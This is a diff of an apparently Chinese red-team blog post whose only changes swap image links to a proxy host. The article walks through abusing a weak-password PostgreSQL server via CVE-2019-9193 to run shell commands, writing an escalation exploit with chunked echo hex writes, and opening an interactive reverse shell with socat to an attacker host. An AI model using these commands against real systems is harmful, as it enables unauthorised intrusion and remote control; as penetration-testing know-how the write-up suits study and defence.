@@ -25,7 +25,7 @@ ___发表于_
 
 #PostgreSQL 1 个
 
-![](https://gitee.com/fuli009/images/raw/master/public/20220923140028.png)**
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220923140028.png)**
 Part1 前言
 **在日常的内网横向过程中，对于SMB、Mysql、SSH、Sqlserver、Oracle等服务的弱口令爆破是常用手段，重复的红队攻防比赛使得这些服务的弱口令越来越少了。所以在平时，
 **ABC_123也会关注一些其它服务的弱口令提权方法** ，有时候会在内网横向中收到奇效。本期就分享一个在内网渗透中，遇到的
@@ -47,7 +47,7 @@ current_setting('server_version_num');
 name = 'data_directory';  
 \-- 获取配置文件路径selectsetting from pg_settings where name='config_file'  
 \-- 获取Postgres内网ip地址select
-inet_server_addr()![](https://gitee.com/fuli009/images/raw/master/public/20220923140029.png)  
+inet_server_addr()![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220923140029.png)  
 
   *  **PostgreSQL提权漏洞尝试**
 
@@ -60,14 +60,14 @@ inet_server_addr()![](https://gitee.com/fuli009/images/raw/master/public/2022092
 还找到一个漏洞是 **CVE-2019-9193**
 ，这个漏洞看起来非常好，可以直接执行系统命令，还可以看到回显结果。使用起来也比较简单。如下图所示，这个postgres数据库没有root权限。
 
-![](https://gitee.com/fuli009/images/raw/master/public/20220923140030.png)  
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220923140030.png)  
   
 
   * ##  **Linux提权操作却无gcc**
 
 通过postgreSQL提权漏洞，我们可以执行linux系统命令了，接下来需要提权到服务器的root权限。我想到的方法是上传一个提权exp，通过linux系统漏洞提权到root权限。可是操作起来没那么简单，
 **因为这个docker容器没装gcc**
-。这种情况也有解决办法，准备一个相似的docker环境，编译好一个exp，将此二进制文件传到服务器上即可运行成功。![](https://gitee.com/fuli009/images/raw/master/public/20220923140031.png)  
+。这种情况也有解决办法，准备一个相似的docker环境，编译好一个exp，将此二进制文件传到服务器上即可运行成功。![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220923140031.png)  
 
   * ##  **echo命令写二进制文件**
 
@@ -75,13 +75,13 @@ inet_server_addr()![](https://gitee.com/fuli009/images/raw/master/public/2022092
 **那么只能直接写二进制文件了** ，可是问题又来了，| base64 -d 命令不存在、|xxd -r -ps
 命令也不存在，怎么写二进制文件呢？看来只剩下echo命令可用了，经过一系列测试，发现echo是可以直接写入二进制文件的， **命令如下echo -e -n
 "\x23" >>
-exploit3.bin。比较麻烦的是，需要把二进制文件转成16进制格式的，如下图所示**：![](https://gitee.com/fuli009/images/raw/master/public/20220923140032.png)  
+exploit3.bin。比较麻烦的是，需要把二进制文件转成16进制格式的，如下图所示**：![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220923140032.png)  
 接下来就是与postgres的提权语句结合起来使用了，原有的echo命令是这样的：echo -e -n
 "\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23" >>
 test3.bin但是放在postgres必须用以下这样方式才行，试了好多次，只有这样才能写成功！注意，
 **echo左边的是两个单引号，不是双引号，exploit3.bin右边是3个单引号** 。COPY cmd_exec FROM PROGRAM
 '/bin/bash -c ''echo -e -n "\x33" >>
-exploit3.bin''';最终通过postgres提权漏洞写入提权exp文件的具体语句如下：![](https://gitee.com/fuli009/images/raw/master/public/20220923140034.png)  
+exploit3.bin''';最终通过postgres提权漏洞写入提权exp文件的具体语句如下：![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220923140034.png)  
 最终exploit3.bin文件写入成功了，执行chmod 777 exploit3.bin之后，运行此文件，发现没反应，这时候我才反应过来。。。
 **这个提权exp需要交互环境**
 ！！！接下来我需要传一个nc啥的反弹shell获取交互环境吗？可是nc也不一定能获取纯交互环境呀。我想到了一个好久没用的工具socat，解决了这个问题。  
@@ -91,7 +91,7 @@ exploit3.bin''';最终通过postgres提权漏洞写入提权exp文件的具体�
 socat这款工具，可以说是nc的升级版本，可以轻松获取到一个纯交互环境，github上有很多绿色免安装版本。执行如下命令后，将会获取到一个完全交互式的TTY会话：Vps上监听端口socat
 file:`tty`,raw,echo=0 tcp-listen:8888  
 内网服务器上运行socat exec:'bash -li',pty,stderr,setsid,sigint,sane
-tcp:10.0.3.4:888888服务器不通外网怎么办呢，正好我们webshell有一台服务器，就反弹到webshell这个服务器上吧。（下图来源于网络）![](https://gitee.com/fuli009/images/raw/master/public/20220923140035.png)  
+tcp:10.0.3.4:888888服务器不通外网怎么办呢，正好我们webshell有一台服务器，就反弹到webshell这个服务器上吧。（下图来源于网络）![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220923140035.png)  
 
   * ##  **分割二进制大文件写入成功**
 
@@ -100,11 +100,11 @@ tcp:10.0.3.4:888888服务器不通外网怎么办呢，正好我们webshell有�
 ，文件太大写不进去。接下来怎么办？继续干！于是把二进制文件分割开，挨个执行echo -e -n命令叠加写入二进制文件，经过一系列测试发现，
 **一个367k大小的socat文件，需要分割成近15份才能写入成功**
 。也是我用java写了一个小程序，将socat文件分割成15份，并且自动生成postgres提权命令。
-**关注公众号，后台回复“333”，即可获取二进制文件转16进制的java代码文件。**![](https://gitee.com/fuli009/images/raw/master/public/20220923140037.png)  
+**关注公众号，后台回复“333”，即可获取二进制文件转16进制的java代码文件。**![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220923140037.png)  
  **  Part3 总结 ** **1.
 **echo命令写二进制文件可以关注一下，遇到大文件，可以把大文件分割成好几份，逐个echo写入，最后叠加成最终的二进制文件。 **2.
 **内网横向中不只要关注mssql、redis、oracle的提权，其它的不常用的服务的提权方法，平时也需要多收集。 **3.
-**socat这款工具可以获取一个纯交互环境，而且在docker精简环境下仍能正常使用。![](https://gitee.com/fuli009/images/raw/master/public/20220923140038.png)专注于网络安全技术分享，包括红队、蓝队、日常渗透测试、安全体系建设等每周一篇，99%原创，敬请关注![](https://gitee.com/fuli009/images/raw/master/public/20220923140039.png)
+**socat这款工具可以获取一个纯交互环境，而且在docker精简环境下仍能正常使用。![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220923140038.png)专注于网络安全技术分享，包括红队、蓝队、日常渗透测试、安全体系建设等每周一篇，99%原创，敬请关注![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220923140039.png)
 **往期精彩回顾**
 ****[第21篇：判断Weblogic详细版本号的方法总结](http://mp.weixin.qq.com/s?__biz=MzkzMjI1NjI3Ng==&mid=2247484386&idx=1&sn=9104bd3fad09c607c0ce4b02e483957d&chksm=c25fcc99f528458f8f29d93f9fb7c961255bb64351061e0d6b0eb0c3fc08f2b660e53d45459d&scene=21#wechat_redirect)  
 [第20篇：改造冰蝎客户端适配JNDIExploit的内存马](http://mp.weixin.qq.com/s?__biz=MzkzMjI1NjI3Ng==&mid=2247484370&idx=1&sn=41144e2b24cf223753b1f631b7a7269b&chksm=c25fcca9f52845bfec4aceb55bbc2e35b95605873193a0a499b9505957039619598ae458b045&scene=21#wechat_redirect)
